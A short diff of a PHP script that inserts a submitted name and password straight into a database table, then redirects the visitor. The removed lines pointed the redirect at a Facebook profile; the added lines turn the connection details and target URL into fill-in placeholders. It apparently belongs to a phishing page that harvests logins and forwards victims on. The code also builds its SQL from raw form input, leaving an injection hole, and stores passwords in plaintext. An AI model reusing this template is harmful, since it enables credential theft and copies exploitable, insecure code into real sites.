@@ -32,10 +32,10 @@ if(strlen($empty_err)==0 && strlen($pass_err)==0)
   global $pass;
   $name=$_POST['name'];
   $pass=$_POST['password'];
-  $connect=mysqli_connect("localhost","root","","data");
+  $connect=mysqli_connect("/*your local server may be (localhost)*/","/*your username*/","/*your password*/","/*database_name*/");
   $query="INSERT INTO `datas` (`name`, `pass`) VALUES ('$name','$pass')";
   $execute=mysqli_query($connect,$query);
-  header("Location: https://www.facebook.com/uday.sah.54943");
+  header("Location: /* your url*/");
   }
 }
 ?>
